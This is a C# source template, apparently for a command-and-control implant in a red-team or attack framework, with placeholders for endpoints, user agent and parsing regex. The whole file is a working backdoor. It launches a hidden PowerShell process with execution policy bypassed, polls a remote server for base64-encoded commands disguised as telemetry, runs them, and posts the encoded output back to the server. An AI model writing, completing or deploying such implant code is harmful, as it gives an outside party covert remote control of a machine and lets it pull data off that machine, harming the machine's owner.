
using System;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Text;
using System.Threading;

class Program
{

	static readonly object _logLock = new object();
	static string _logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "http.log");

	internal static void Log(string msg, Exception ex = null)
	{
		try
		{
			var line = $"[{DateTime.UtcNow:O}] {msg}" + (ex != null ? $" | EX: {ex}" : "");
			lock (_logLock) File.AppendAllText(_logPath, line + Environment.NewLine, Encoding.UTF8);
		}
		catch { /* avoid crashing on logging errors */ }
	}

	static void Main(string[] args)
	{
		// 1) Generate a persistent SID
		string sid = GenerateSid();

		// 2) Endpoints (profile-aware)
		string getUrl  = "{{GET_URL}}";
		string postUrl = "{{POST_URL}}";

		Log($"GetURL: {getUrl}, Posturl: {postUrl}");

		// 3) Start a hidden, persistent PowerShell process
		var psi = new ProcessStartInfo {
			FileName               = "powershell.exe",
			Arguments              = "-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass",
			RedirectStandardInput  = true,
			RedirectStandardOutput = true,
			RedirectStandardError  = true,
			UseShellExecute        = false,
			CreateNoWindow         = true,
		};
		var ps = Process.Start(psi);
		if (ps == null) {
			return;
		}

		var outMem = new MemoryStream();
		var errMem = new MemoryStream();
		Thread tOut = new Thread(() => CopyStream(ps.StandardOutput.BaseStream, outMem)) { IsBackground = true };
		Thread tErr = new Thread(() => CopyStream(ps.StandardError .BaseStream, errMem)) { IsBackground = true };
		tOut.Start();
		tErr.Start();

		var psIn = ps.StandardInput;

		// 4) Main loop
		while (true)
		{

			try
			{
				var getReq = (HttpWebRequest)WebRequest.Create(getUrl);
				getReq.Method    = "GET";
				getReq.Proxy = null;
				getReq.UserAgent = "{{USER_AGENT}}";
				getReq.Headers.Add("X-Session-ID", sid);
				{{ACCEPT_LINE}}
				{{HOST_LINE}}
				{{RANGE_LINE}}
				{{GET_HEADERS}}

				string body;
				using (var getResp = (HttpWebResponse)getReq.GetResponse())
				using (var sr      = new StreamReader(getResp.GetResponseStream(), Encoding.UTF8))
				body = sr.ReadToEnd();
				Log($"Got Body: {body}");

				var cmdB64 = ParseTelemetry(body);
				Log($"Got base64cmd {cmdB64}");

				if (!string.IsNullOrEmpty(cmdB64))
				{
					var cmdBytes = Convert.FromBase64String(cmdB64);
					var cmdText  = Encoding.UTF8.GetString(cmdBytes);

					Log($"Got CMD text {cmdText}");

					psIn.WriteLine(cmdText);
					psIn.Flush();
				}
				else
				{
				}

				Thread.Sleep(2000);

				string outRaw;
				lock (outMem)
				{
					outMem.Position = 0;
					errMem.Position = 0;
					var stdout = new StreamReader(outMem, Encoding.UTF8).ReadToEnd();
					var stderr = new StreamReader(errMem, Encoding.UTF8).ReadToEnd();
					outRaw = stdout + stderr;
					outMem.SetLength(0);
					errMem.SetLength(0);
				}

				var outBytes = Encoding.UTF8.GetBytes(outRaw);
				var outB64   = Convert.ToBase64String(outBytes);
				var json = {{POST_JSON_EXPR}};
				Log($"Sending JSON: {json}");

				var postReq = (HttpWebRequest)WebRequest.Create(postUrl);
				postReq.Method      = "POST";
				postReq.Proxy = null;
				postReq.UserAgent   = "{{USER_AGENT}}";
				postReq.ContentType = "application/json";
				postReq.Headers.Add("X-Session-ID", sid);
				{{POST_HEADERS}}

				var postData = Encoding.UTF8.GetBytes(json);
				postReq.ContentLength = postData.Length;
				using (var reqStream = postReq.GetRequestStream())
				{
					reqStream.Write(postData, 0, postData.Length);
				}

				using (var postResp = (HttpWebResponse)postReq.GetResponse())
				{
				}
			}
			catch (Exception ex)
			{
			}

			Thread.Sleep({{SLEEP_LONG}});
		}
	}

	static void CopyStream(Stream input, Stream output)
	{
		var buffer = new byte[4096];
		int read;
		try
		{
			while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
			{
				output.Write(buffer, 0, read);
				output.Flush();
			}
		}
		catch (Exception ex)
		{
		}
	}

	static string GenerateSid()
	{
		const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
		int seed = (int)DateTime.Now.Ticks ^ Process.GetCurrentProcess().Id;
		var rnd = new Random(seed);
		var sb  = new StringBuilder(3 * 5 + 2);
		for (int seg = 0; seg < 3; seg++)
		{
			for (int i = 0; i < 5; i++)
				sb.Append(chars[rnd.Next(chars.Length)]);
			if (seg < 2) sb.Append('-');
		}
		return sb.ToString();
	}

	static string ParseTelemetry(string resp)
	{
		var m = Regex.Match(resp, {{PROBE_UNION}});
		if (m.Success) {
			return m.Groups["b64"].Value;
		} else {
			return null;
		}
	}
}
